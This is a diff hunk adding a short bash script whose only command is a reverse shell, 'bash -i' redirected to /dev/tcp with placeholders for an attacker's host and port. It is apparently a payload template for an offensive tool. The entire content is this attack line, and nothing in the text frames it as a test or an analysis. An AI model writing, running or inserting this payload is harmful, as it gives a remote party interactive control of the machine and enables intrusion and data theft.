@@ -1,0 +1,3 @@
+#!/bin/bash
+
+bash -i >& /dev/tcp/%s/%s 0>&1
